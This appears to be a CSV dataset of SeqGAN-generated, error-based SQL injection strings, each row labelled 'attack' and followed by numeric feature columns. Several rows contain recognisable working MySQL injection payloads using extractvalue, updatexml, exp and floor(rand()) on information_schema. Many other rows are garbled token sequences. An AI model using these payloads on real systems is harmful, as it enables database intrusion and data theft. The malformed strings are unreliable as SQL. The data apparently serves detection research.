attack,"1""   SELECT 0 AYNITINT  grahr  (  (    select information_schemaer   FROM  =  rand,le113  0x7171706a71,,W  0x7171706a71,  ||chr  (  4493  =  ||coun  us.  g L IN.chr  (  (  ||  =  113  >  select   )    ,  )   AND from concat  (  0   SELECT 4493 LS'  =  'tout   hhr  FROM  rand  select  1. ,1 select DITer  _ri   or 8488  R",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,267,321.0,51.0,4.488601215358934,139.0,43.0,106.0,33.0,0.43302180685358255,0.13395638629283488,0.3302180685358255,0.102803738317757,2.0,1.0,0.0,0.0,0.0,4.0,0.0,8.0,0.0,2.0,6.0,11.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"r'a_mFROM   0 from Vor N 1 G  #,floor  113  ac_et  (  then  =  )  )   from end  )  ||chr  (  *   =  )  )  113  ,concat       ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,268,125.0,32.0,3.6415276359634023,45.0,8.0,54.0,18.0,0.36,0.064,0.432,0.144,1.0,0.0,0.0,0.0,1.0,2.0,0.0,7.0,0.0,2.0,2.0,5.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1""   (    ,  select union""ass whentsut.ss   (  select 0 or 0 1297  ||chr  select   ,  ||chouunadd.show_abbp'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '' like 'erass.cha  (  113   )    extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,269,355.0,40.0,4.1268344640038706,151.0,46.0,118.0,40.0,0.4253521126760563,0.1295774647887324,0.3323943661971831,0.11267605633802817,4.0,2.0,0.0,0.0,0.0,1.0,0.0,18.0,0.0,1.0,7.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"-9740'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '`.es.gestt_r.r  ) or 9325  select  , 8488 and 1 #NUSTASNTIhs   x2   )i  )    )   having 'i'  ) or  L     whenxT  *2   (  )    (  )       1045  )    )   )    )    )     ||ISNAUT.U'i'  122  SELECTIT end  )  =  )   (  || whenS   fromunase  113  ,0x717a767a71,0x717a767a71,0x717a767a71n when   SELECTinformation_schemaT  SELECT end,1  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,270,514.0,51.0,4.175764253160495,168.0,87.0,194.0,65.0,0.32684824902723736,0.16926070038910507,0.377431906614786,0.1264591439688716,6.0,0.0,1.0,0.0,1.0,2.0,0.0,33.0,0.0,2.0,10.0,8.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'a7562_r.(  *   )       =  )     (  SELECT whenr  x  || hhr  (    113  *   )  ,  ),7562  )  (  tr  =  ||csx.   1297  106  ||chr  (  (  0x717a767a71,1   )    )     concat  chr  (  (  i  select from d_r  (  Y      case LC4493T  ||chhoyunuint  ,  ||chr  (  ||  (  (  case 0 hualt_me",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,271,449.0,45.0,3.8633697304135883,120.0,72.0,189.0,68.0,0.267260579064588,0.1603563474387528,0.4209354120267261,0.1514476614699332,2.0,0.0,0.0,0.0,2.0,3.0,0.0,33.0,1.0,3.0,10.0,17.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'hofo'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'w",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,272,583.0,34.0,3.4284811766888996,134.0,101.0,269.0,79.0,0.22984562607204118,0.1732418524871355,0.4614065180102916,0.13550600343053174,4.0,2.0,0.0,0.0,2.0,3.0,0.0,52.0,0.0,0.0,14.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,0.0,0.0,2.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0
attack,-')   1a 1 4493T b 5305 andE   9325  5840  )  )  4386  )   SELECT DIMANCT  (  )  )  0 WHERE 3785 =  ||r  (  )  )  )    )   SELECT 1   n  )  ||athrssSunn*2   )  case mm   (,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,273,171.0,43.0,3.919464566855356,49.0,29.0,70.0,23.0,0.28654970760233917,0.1695906432748538,0.4093567251461988,0.13450292397660818,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.0,0.0,0.0,0.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'eeada_uin=_narayualadds.(  113  ||  (  (  select and union  113   m    'i'  3326113  (  ||cr  (  ||counad.erahr  (  0x7171706a71,  ||chr  (  4232  select from t 113  ||cho  (  )  5023  and     (  select from froms.gr.(  (  =  ||chr  =hr.t_ntsroMr.asp a   (  )  )  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,274,475.0,40.0,3.920632137785308,151.0,66.0,186.0,72.0,0.3178947368421053,0.13894736842105262,0.391578947368421,0.15157894736842106,4.0,0.0,0.0,0.0,1.0,4.0,0.0,36.0,0.0,3.0,5.0,17.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,1.0,0.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"1""hr  =  case =  x  atr.alivgca_rs   (  =  6237  (    )   )   )    )     and x W.chr  rand  112  ||chr  u  113  0 from or #(  ||chr  (  ||chr  (  ||c  =  122  select ,  (  *  ,  rand  )  )   and or when(  4232  having from by x   from :a_art_Wr  (  (  5483  0x7171706a71*   R7469  case p m",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,275,289.0,46.0,4.029312037437971,99.0,37.0,114.0,39.0,0.34256055363321797,0.12802768166089964,0.3944636678200692,0.13494809688581316,0.0,1.0,0.0,0.0,2.0,4.0,0.0,15.0,0.0,3.0,2.0,14.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,3.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,15192x_nt,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,276,9.0,8.0,2.94770277922009,3.0,5.0,0.0,1.0,0.3333333333333333,0.5555555555555556,0.0,0.1111111111111111,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"r a  113  )    ,,floor  *",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,277,25.0,11.0,2.801706277574314,7.0,3.0,11.0,4.0,0.28,0.12,0.44,0.16,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""_r  teSd_rnayerosuas_nuadft,xsiaytss whena.select dOoNs.r  (  (  ||chr  (  =  select end2   )     )  ,  =  )   )     2 by D FROM end  ||chr  (  113  case",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,278,155.0,37.0,4.130834338710007,76.0,6.0,51.0,22.0,0.49032258064516127,0.03870967741935484,0.32903225806451614,0.14193548387096774,0.0,1.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,3.0,2.0,6.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1 AND 1 O5483chr.UINCT0x717a767a71.cha  (  ~  *   9173 )   )  )     (  122un  )    )  || end  (  ||chhr  = 3051m)   FROM   then information_schemaT  (  0  having from information_schema hr  (  0  =  select   (0x717a767a71,concat  0   from 1 I dbkhojutlet_reyyery_.hr  (  chr  =  axx.dbyzww_att.a_roysl",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,279,301.0,55.0,4.639276980374088,144.0,39.0,84.0,34.0,0.47840531561461797,0.12956810631229235,0.27906976744186046,0.11295681063122924,0.0,0.0,0.0,0.0,1.0,3.0,0.0,13.0,0.0,6.0,1.0,8.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ehrtysauaam(  :select concat  )  )     (  113  6825 FROM  select D 1 5305  ,0x5c    = and   113  0    SELECT from   (  a  0T xs mSAm)       from :0(  concat  =  ||chselect from  (  4232  ,0x717a767a71,floor  ||_r  (  *  )  =   or end  )   then bys D     ITo hr  *  SELECT end  )   thenx  (  #2   )     FROM having t  6082  (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,280,534.0,54.0,3.9586467261996323,177.0,70.0,227.0,60.0,0.33146067415730335,0.13108614232209737,0.4250936329588015,0.11235955056179775,2.0,0.0,0.0,0.0,3.0,4.0,0.0,35.0,0.0,1.0,7.0,11.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,0.0,0.0,6.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,20.0
attack,1tt_ystzuvkys/rachinformation_schema'  =  'cu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,281,45.0,23.0,4.374860596185444,34.0,1.0,4.0,6.0,0.7555555555555555,0.022222222222222223,0.08888888888888889,0.13333333333333333,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,282,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%Q""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  """"  )   thenINCCies union 5483  ,0x717a767a71.,0x78   having R'i'  and  )   or 1 x x  )    AND SELECT 1  )   )    =  =m0 concat  (  SELECT D when 8488 else a from when   (  select Do  )  ||  (  )  ~  4232  --1297whereaj  || AND  )(  6825  )2 1   )and from :r  (  select end  )    ,  (  )  ||chyr  (  )   or Y2017 1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,283,608.0,60.0,4.187996938608293,218.0,77.0,236.0,77.0,0.35855263157894735,0.12664473684210525,0.3881578947368421,0.12664473684210525,2.0,3.0,2.0,0.0,2.0,3.0,0.0,44.0,1.0,2.0,8.0,13.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,1.0,0.0,4.0,6.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"16'  =  'ntunaseer.r  (  ||  =  =  )   )    --itA   FROMn ASunion ROWEIo  case when   (  || then 4493  || else x end  113  )        )    || unionINSUendea end  )   then1 end    (  )||I. RNT  (  =  (  )   ""  )  )   (  from  ||chr  u  ||chr  (  and   AND WHERE group  h 5192 mbelyetunsx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,284,284.0,51.0,4.080153773029721,118.0,14.0,111.0,41.0,0.4154929577464789,0.04929577464788732,0.3908450704225352,0.1443661971830986,2.0,1.0,2.0,0.0,0.0,4.0,0.0,16.0,0.0,0.0,0.0,20.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"r.cu  (  --al4232     )na 8488 from  ||c  (  0x7171706a712 when   (  ||r  (  ||chrr  (  0  select whenhrros   or FROM chr  (  (  0  =  )   )  ,floor  || from group  (  case ,  =  ||chrr  ( 1392r  (  (  case 3785 unionIs group by when   (  )   6055l 0 1 1210  )   (  )     (  6055  )     or)  )   )   a D 0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,285,305.0,44.0,3.9171296799759694,97.0,44.0,123.0,41.0,0.3180327868852459,0.14426229508196722,0.40327868852459015,0.13442622950819672,0.0,0.0,2.0,0.0,0.0,2.0,0.0,24.0,0.0,0.0,2.0,14.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,3.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"9891aur  6237= case when   (  (  (  (  || concat  )  chr  (  select concat  (    select  1 WHERE 3785 d information_schema.chr  5023r  (  (  ,  =  )     )  a   (  (  ||cu  chr  (  from  (  )  0   WHERE union 1hr  (  )  ||chr  cr  (  ||,  (  =  ||chr  (  ,  )  113  selectselect 1   ,1  )   )  )  ,0x717a767a71,0x78",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,286,314.0,38.0,3.92140163092372,111.0,36.0,121.0,46.0,0.3535031847133758,0.11464968152866242,0.3853503184713376,0.1464968152866242,0.0,0.0,0.0,0.0,0.0,3.0,0.0,25.0,0.0,1.0,6.0,13.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ''   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wwfj' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,287,690.0,43.0,3.8211160029494327,213.0,113.0,280.0,84.0,0.30869565217391304,0.16376811594202897,0.4057971014492754,0.12173913043478261,6.0,0.0,0.0,0.0,2.0,4.0,0.0,53.0,0.0,2.0,15.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.0,0.0,1.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,1'a end  )     )    (  ||ch x.chr  (  (  ||chr  (  || from  ||c(  0  =  )e  )   )     R 0 1 else union 1S group 1 x         and LSYS DAMINGIECA1   I  select 1 IT  =  )  0   )   and   )    n when     ||  (  =  )   from else Aendj.USRor 1 where then *a from 0 and select by ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,288,272.0,46.0,3.85297260518028,113.0,11.0,116.0,32.0,0.41544117647058826,0.04044117647058824,0.4264705882352941,0.11764705882352941,1.0,0.0,0.0,0.0,1.0,3.0,0.0,15.0,0.0,0.0,0.0,14.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1'   )ua a  information_schemaow IT  5023  )    1210  )   =  ,0x717a767a71,concat  4386  )   then end  =  ,i)   )    )     or 7881 xr  (   concat  (  00x717a767a71v  ,1  =         then 4386  (hr  (  (  (  106  1  =  )n  case and else 7158  )   --  ui(  (  )   x     Rchr  (  ||Uchr  (  9067  ||chr  113  =  =  ,113  ,  #0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,289,332.0,42.0,3.87022389810415,90.0,68.0,133.0,41.0,0.2710843373493976,0.20481927710843373,0.4006024096385542,0.12349397590361445,1.0,0.0,2.0,0.0,0.0,6.0,0.0,20.0,0.0,1.0,6.0,12.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"15996xxwel  (  6237b)   5978 ||r  (  (  >  =  )     (  0  )     ,7469  113  )   )    )   and SELECT WHEREE  (  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,290,113.0,35.0,3.5687047694680394,22.0,21.0,52.0,18.0,0.19469026548672566,0.18584070796460178,0.46017699115044247,0.1592920353982301,0.0,0.0,2.0,0.0,0.0,1.0,0.0,11.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1 '||  (  select '   FROM end   SELECT d=  (  4232  casetWdr.s   (  || concat  =  6237,  ||chr  (  (  select else 2131 4607   )     )   E0 6055  ||u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,291,148.0,38.0,4.020344901357321,50.0,22.0,55.0,21.0,0.33783783783783783,0.14864864864864866,0.3716216216216216,0.14189189189189189,2.0,0.0,0.0,0.0,0.0,2.0,0.0,7.0,0.0,0.0,1.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1  eo9740lowutts   )    --2   )    )    and (  113  0 FROMx DIT end   WHERE 3051 0 1  ||chr  =  #  =  e     tr  SELECT from and h1hr  (  0  ,  ,and concat  ||chr  u  (  )          #  6237,floor  =  t_r  = where select 4386  ,  ,1  )0x717a767a71,1   )    e   d  a information_schema bya  D group 0 end  )    )  4232  )   from ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,292,325.0,53.0,4.122846281199427,120.0,42.0,131.0,32.0,0.36923076923076925,0.12923076923076923,0.40307692307692305,0.09846153846153846,0.0,0.0,2.0,0.0,0.0,4.0,0.0,12.0,0.0,2.0,6.0,10.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,2.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"r9740e ' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ountetowes  0x7171706a71    then end  ||cu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,293,242.0,32.0,4.00732510704173,92.0,50.0,78.0,22.0,0.38016528925619836,0.2066115702479339,0.32231404958677684,0.09090909090909091,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-59671\chr' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 't_hr.g  (  as L FROMu  byL else 4607   9627 8488 AND end  rand  case   ,1 3931 concat  =  ,0x78)i     )    8190     (  )  #,  0  rand",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,294,336.0,49.0,4.173337914655429,117.0,66.0,119.0,34.0,0.3482142857142857,0.19642857142857142,0.3541666666666667,0.10119047619047619,2.0,0.0,1.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,8.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1v' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'ljwvw;      (  ||hr  (  6055  ||chr  (  ||cst_r.gsxr.(  select dhr  (  =  )   or x 5584 E  )     ),0x717a767a71    )   a LIA.1 group where end   FROM  )   2131 4232  au   =  )    )   xunion ||hr  )  (  =  #,1   x. A from from union else O- select)   x and  || where m when   (  ||chr(  (  0  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,295,590.0,54.0,4.167702490822889,210.0,83.0,222.0,75.0,0.3559322033898305,0.14067796610169492,0.376271186440678,0.1271186440677966,2.0,0.0,1.0,0.0,2.0,4.0,1.0,38.0,0.0,1.0,8.0,20.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,8.0,4.0,2.0,4.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
